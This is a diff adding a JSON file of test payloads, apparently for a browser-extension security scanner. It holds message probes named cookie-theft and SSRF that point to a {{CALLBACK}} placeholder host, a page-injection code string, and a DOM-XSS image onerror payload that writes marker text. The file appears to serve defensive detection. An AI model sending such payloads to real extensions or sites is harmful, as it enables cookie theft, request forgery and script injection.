@@ -1,0 +1,32 @@
+{
+  "external": [
+    {
+      "name": "ping",
+      "message": { "action": "ping" }
+    },
+    {
+      "name": "cookie-theft",
+      "message": { "action": "collect", "callback": "{{CALLBACK}}" }
+    },
+    {
+      "name": "ssrf",
+      "message": { "action": "fetch", "url": "{{CALLBACK}}?ssrf=1" }
+    },
+    {
+      "name": "page-injection",
+      "message": {
+        "action": "inject",
+        "code": "document.getElementById('exthawk-inject').textContent='EXTHAWK_INJECT'"
+      }
+    }
+  ],
+  "postMessage": [
+    {
+      "name": "dom-xss",
+      "data": {
+        "type": "hawk-render",
+        "html": "<img src=x onerror=\"document.getElementById('exthawk-dom').textContent='EXTHAWK_DOM'\">"
+      }
+    }
+  ]
+}
